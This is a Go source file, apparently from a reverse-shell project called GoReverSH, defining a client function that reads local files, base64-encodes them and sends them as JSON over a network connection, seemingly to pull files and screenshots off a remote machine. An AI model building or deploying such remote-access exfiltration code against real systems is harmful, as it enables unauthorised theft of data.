package pkgclient

import (
	"GoReverSH/utils"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func SendFile(filenames []string, conn net.Conn) {
	for _, fname := range filenames {
		//sendfile args fname
		f, err := os.Open(fname)
		if err != nil {
			break
		}

		fstats, err := f.Stat()
		if err != nil {
			break
		}

		filePath := strings.Split(fname, "/")
		fileLastname := filePath[len(filePath)-1]

		var content []byte
		buff := make([]byte, 1024)
		size := 0

		for {
			n, err := f.Read(buff)
			if err != nil {
				if n == 0 || errors.Is(err, io.EOF) {
					break
				}
				log.Println(err)
				break
			}
			//content + bufの中身を一時的に保存。
			tmp := make([]byte, 0, size+n)
			tmp = append(content[:size], buff[:n]...)
			content = tmp
			size += n
			if n < 1024 {
				break
			}
		}

		imageToBase64 := base64.StdEncoding.EncodeToString(content)
		src := filepath.Join("screenshot", fileLastname)
		fileinfo := utils.FileInfo{Name: src, Body: []byte(imageToBase64), Size: fstats.Size()}

		output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

		err = json.NewEncoder(conn).Encode(output)
		if err != nil {
			break
		}

		f.Close()
	}
}
